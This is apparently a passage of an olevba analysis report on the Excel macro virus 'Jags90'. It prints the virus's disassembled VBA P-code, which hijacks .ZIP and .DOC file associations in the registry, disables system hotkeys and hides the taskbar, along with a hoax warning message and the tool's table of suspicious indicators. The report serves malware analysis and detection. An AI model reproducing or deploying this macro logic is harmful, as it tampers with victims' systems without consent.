' 	Dim (Const) 
' 	LitDI4 0x0007 0x0000 
' 	VarDefn ERROR_INVALID_PARAMETER
' Line #19:
' 	Dim (Const) 
' 	LitDI4 0x0008 0x0000 
' 	VarDefn ERROR_ACCESS_DENIED
' Line #20:
' 	Dim (Const) 
' 	LitHI4 0x0000 0x8000 
' 	VarDefn HKEY_CLASSES_ROOT
' Line #21:
' 	Dim (Const) 
' 	LitDI4 0x0104 0x0000 
' 	VarDefn MAX_PATH
' Line #22:
' 	Dim (Const) 
' 	LitDI2 0x0001 
' 	VarDefn REG_SZ
' Line #23:
' Line #24:
' Line #25:
' 	Dim 
' 	VarDefn sKeyName (As String)
' 	QuoteRem 0x0019 0x001B "Holds Key Name in registry."
' Line #26:
' 	Dim 
' 	VarDefn sKeyValue (As String)
' 	QuoteRem 0x0019 0x001C "Holds Key Value in registry."
' Line #27:
' 	Dim 
' 	VarDefn ret
' 	QuoteRem 0x0019 0x0029 "Holds error status if any from API calls."
' Line #28:
' 	Dim 
' 	VarDefn lphKey
' 	QuoteRem 0x0019 0x002B "Holds created key handle from RegCreateKey."
' Line #29:
' Line #30:
' 	QuoteRem 0x0000 0x0035 "This creates a Root entry called "JAGS90 VIRUS V2.0"."
' Line #31:
' 	LitStr 0x0011 "JAGS90 VIRUS V2.0"
' 	St sKeyName 
' Line #32:
' 	LitStr 0x0024 "Jags90 Virus V2.0 By Jags Andrew 90®"
' 	St sKeyValue 
' Line #33:
' 	Ld HKEY_CLASSES_ROOT 
' 	Ld sKeyName 
' 	Ld lphKey& 
' 	ArgsLd RegCreateKey& 0x0003 
' 	St ret& 
' Line #34:
' 	Ld lphKey& 
' 	LitStr 0x0000 ""
' 	Ld REG_SZ 
' 	Ld sKeyValue 
' 	LitDI4 0x0000 0x0000 
' 	ArgsLd RegSetValue& 0x0005 
' 	St ret& 
' Line #35:
' 	QuoteRem 0x0004 0x0014 "EVERYONE ZIPED FILES"
' Line #36:
' 	QuoteRem 0x0000 0x004A "This creates a Root entry called .ZIP associated with "JAGS90 VIRUS V2.0"."
' Line #37:
' 	LitStr 0x0004 ".ZIP"
' 	St sKeyName 
' Line #38:
' 	LitStr 0x0011 "JAGS90 VIRUS V2.0"
' 	St sKeyValue 
' Line #39:
' 	Ld HKEY_CLASSES_ROOT 
' 	Ld sKeyName 
' 	Ld lphKey& 
' 	ArgsLd RegCreateKey& 0x0003 
' 	St ret& 
' Line #40:
' 	Ld lphKey& 
' 	LitStr 0x0000 ""
' 	Ld REG_SZ 
' 	Ld sKeyValue 
' 	LitDI4 0x0000 0x0000 
' 	ArgsLd RegSetValue& 0x0005 
' 	St ret& 
' Line #41:
' Line #42:
' 	QuoteRem 0x0000 0x0033 "This sets the command line for "JAGS90 VIRUS V2.0"."
' Line #43:
' 	LitStr 0x0011 "JAGS90 VIRUS V2.0"
' 	St sKeyName 
' Line #44:
' 	ArgsLd OBTENER_DIR_WINDOWS 0x0000 
' 	LitStr 0x000F "\NOTEPAD.exe %1"
' 	Concat 
' 	St sKeyValue 
' Line #45:
' 	Ld HKEY_CLASSES_ROOT 
' 	Ld sKeyName 
' 	Ld lphKey& 
' 	ArgsLd RegCreateKey& 0x0003 
' 	St ret& 
' Line #46:
' 	Ld lphKey& 
' 	LitStr 0x0012 "shell\open\command"
' 	Ld REG_SZ 
' 	Ld sKeyValue 
' 	Ld MAX_PATH 
' 	ArgsLd RegSetValue& 0x0005 
' 	St ret& 
' Line #47:
' 	QuoteRem 0x0000 0x0012 "EVERYONE DOC FILES"
' Line #48:
' 	QuoteRem 0x0000 0x004A "This creates a Root entry called .DOC associated with "JAGS90 VIRUS V2.0"."
' Line #49:
' 	LitStr 0x0004 ".DOC"
' 	St sKeyName 
' Line #50:
' 	LitStr 0x0011 "JAGS90 VIRUS V2.0"
' 	St sKeyValue 
' Line #51:
' 	Ld HKEY_CLASSES_ROOT 
' 	Ld sKeyName 
' 	Ld lphKey& 
' 	ArgsLd RegCreateKey& 0x0003 
' 	St ret& 
' Line #52:
' 	Ld lphKey& 
' 	LitStr 0x0000 ""
' 	Ld REG_SZ 
' 	Ld sKeyValue 
' 	LitDI4 0x0000 0x0000 
' 	ArgsLd RegSetValue& 0x0005 
' 	St ret& 
' Line #53:
' Line #54:
' 	QuoteRem 0x0000 0x0033 "This sets the command line for "JAGS90 VIRUS V2.0"."
' Line #55:
' 	LitStr 0x0011 "JAGS90 VIRUS V2.0"
' 	St sKeyName 
' Line #56:
' 	ArgsLd OBTENER_DIR_WINDOWS 0x0000 
' 	LitStr 0x000F "\NOTEPAD.exe %1"
' 	Concat 
' 	St sKeyValue 
' Line #57:
' 	Ld HKEY_CLASSES_ROOT 
' 	Ld sKeyName 
' 	Ld lphKey& 
' 	ArgsLd RegCreateKey& 0x0003 
' 	St ret& 
' Line #58:
' 	Ld lphKey& 
' 	LitStr 0x0012 "shell\open\command"
' 	Ld REG_SZ 
' 	Ld sKeyValue 
' 	Ld MAX_PATH 
' 	ArgsLd RegSetValue& 0x0005 
' 	St ret& 
' Line #59:
' Line #60:
' 	EndSub 
' Line #61:
' Line #62:
' _VBA_PROJECT_CUR/VBA/unload_win_hotkeys - 2642 bytes
' Line #0:
' Line #1:
' 	Dim (Private Const) 
' 	LitDI4 0x0061 0x0000 
' 	VarDefn SPI_SCREENSAVERRUNNING
' Line #2:
' 	FuncDefn (Private Declare Function SystemParametersInfo Lib "User32" (ByVal uAction As Long, ByVal uParam As Long, lpvParam As , ByVal fuWinIni As Long) As Long)
' Line #3:
' Line #4:
' 	FuncDefn (Sub UNLOAD_HOTKEYS())
' Line #5:
' 	OnError (Resume Next) 
' Line #6:
' 	Dim 
' 	VarDefn lngRet (As Long)
' Line #7:
' 	Dim 
' 	VarDefn blnOld (As Boolean)
' Line #8:
' 	LineCont 0x0004 06 00 12 00
' 	Ld SPI_SCREENSAVERRUNNING 
' 	LitVarSpecial (True)
' 	Ld blnOld 
' 	LitDI4 0x0000 0x0000 
' 	ArgsLd SystemParametersInfo 0x0004 
' 	St lngRet 
' Line #9:
' 	EndSub 
' Line #10:
' Line #11:
' 	FuncDefn (Sub LOAD_HOTKEYS())
' Line #12:
' 	OnError (Resume Next) 
' Line #13:
' Line #14:
' 	QuoteRem 0x0000 0x001B "Para volver a habilitarlas:"
' Line #15:
' 	Dim 
' 	VarDefn lngRet (As Long)
' Line #16:
' 	Dim 
' 	VarDefn blnOld (As Boolean)
' Line #17:
' 	LineCont 0x0004 06 00 12 00
' 	Ld SPI_SCREENSAVERRUNNING 
' 	LitVarSpecial (False)
' 	Ld blnOld 
' 	LitDI4 0x0000 0x0000 
' 	ArgsLd SystemParametersInfo 0x0004 
' 	St lngRet 
' Line #18:
' 	EndSub 
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' _VBA_PROJECT_CUR/VBA/unload_win_taskbar - 3094 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0015 "PARA OCULTAR LA BARRA"
' Line #1:
' 	FuncDefn (Declare Function FindWindow Lib "User32" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long)
' Line #2:
' 	FuncDefn (Declare Function SetWindowPos Lib "User32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal x As Long, ByVal y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long)
' Line #3:
' 	Dim (Global) 
' 	VarDefn Ventana (As Long)
' Line #4:
' 	Dim (Global Const) 
' 	LitHI2 0x0040 
' 	VarDefn Muestra
' Line #5:
' 	Dim (Global Const) 
' 	LitHI2 0x0080 
' 	VarDefn Oculta
' Line #6:
' Line #7:
' Line #8:
' 	QuoteRem 0x0000 0x0019 "Oculta la barra de tareas"
' Line #9:
' 	FuncDefn (Sub Ocultar_Barra())
' Line #10:
' 	OnError (Resume Next) 
' Line #11:
' 	LitStr 0x000D "Shell_traywnd"
' 	LitStr 0x0000 ""
' 	ArgsLd FindWindow 0x0002 
' 	St Ventana 
' Line #12:
' 	Ld Ventana 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld Oculta 
' 	ArgsCall (Call) SetWindowPos 0x0007 
' Line #13:
' 	EndSub 
' Line #14:
' Line #15:
' 	QuoteRem 0x0000 0x001A "Muestra la barra de tareas"
' Line #16:
' 	FuncDefn (Sub Mostrar_Barra())
' Line #17:
' 	OnError (Resume Next) 
' Line #18:
' 	Ld Ventana 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld Muestra 
' 	ArgsCall (Call) SetWindowPos 0x0007 
' Line #19:
' 	EndSub 
' Line #20:
' _VBA_PROJECT_CUR/VBA/UserForm1 - 1706 bytes
' _VBA_PROJECT_CUR/VBA/Módulo1 - 2081 bytes
' Line #0:
' 	FuncDefn (Sub HappyBirthday())
' Line #1:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0011 
' 	Eq 
' 	IfBlock 
' Line #2:
' 	LitStr 0x001E "Colombia, September 17, 1978.."
' 	LitDI2 0x0007 
' 	LitDI2 0x0001 
' 	LitStr 0x0005 "hoja1"
' 	ArgsLd Worksheets 0x0001 
' 	ArgsMemLd Cells 0x0002 
' 	MemSt Value 
' Line #3:
' 	LitStr 0x002D "Happy Birthday to my brother Christiam (CJGS)"
' 	LitDI2 0x0006 
' 	LitDI2 0x0001 
' 	LitStr 0x0005 "hoja1"
' 	ArgsLd Worksheets 0x0001 
' 	ArgsMemLd Cells 0x0002 
' 	MemSt Value 
' Line #4:
' 	StartWithExpr 
' 	LitDI2 0x0006 
' 	LitDI2 0x0001 
' 	LitStr 0x0005 "Hoja1"
' 	ArgsLd Worksheets 0x0001 
' 	ArgsMemLd Cells 0x0002 
' 	MemLd Font 
' 	With 
' Line #5:
' 	LitStr 0x0005 "Arial"
' 	MemStWith New 
' Line #6:
' 	LitDI2 0x0014 
' 	MemStWith Size 
' Line #7:
' 	EndWith 
' Line #8:
' 	EndIfBlock 
' Line #9:
' 	EndSub 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Jags.a.xls' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Please, you read this message until the end. He is really serious...

VIRUS ALERT: Jags90

If it receives an email with following subject: " Jags90 ", clean  immediately WITHOUT READING IT. This it is the most dangerous virus than never it has existed. If the email is opened, its hard disk will be rewritten completely.

In addition the message will be autosend to all the people of its address book of email.

But not only that, will erase any diskette that is near its computer and will block the card of its movable telephone. It will cut the provision of light of all the building and will shoot to the alarm anti-fires.

It will degauss the magnetic stripe of his credit cards and tellers, it will break the mall pillows of his VHS, and will damage all his CD of music.

Unload  its refrigerator so that the ice creams melt. It will send to him to his ex--honey  his new telephone number. It will add TANG to the tank of his fish box. Its beer will be taken all and will cool the coffee.

It will hide the keys of his car when it is delayed for the work. Jags90 will cause that You fall in love crazy with a blond type with glasses owner of a multinational based on the deceit and the swindle. It will make him have nightmares. It will throw to sugar  to the gas tank of his car.

They will appear to him giant shinbones right the night of the first appointment that as much have  hoped. It will randomly move its car around the parking so that it cannot find it. It will kick its dog.

It will leave libidinous messages in its answering machine. And it will even leave the cover of the open toilet.

These are only some of the symptoms. Be really cautious!

I hope on time to have arrived to save them of this terrible virus.

Send east message to all the people that knows. They will thank for it.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Jags.a.xls' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSExcel.Jags.a.xls' - OLE stream: '_VBA_PROJECT_CUR/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|open                |May open a file                              |
|Suspicious|shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|FindWindow          |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
|IOC       |NOTEPAD.exe         |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

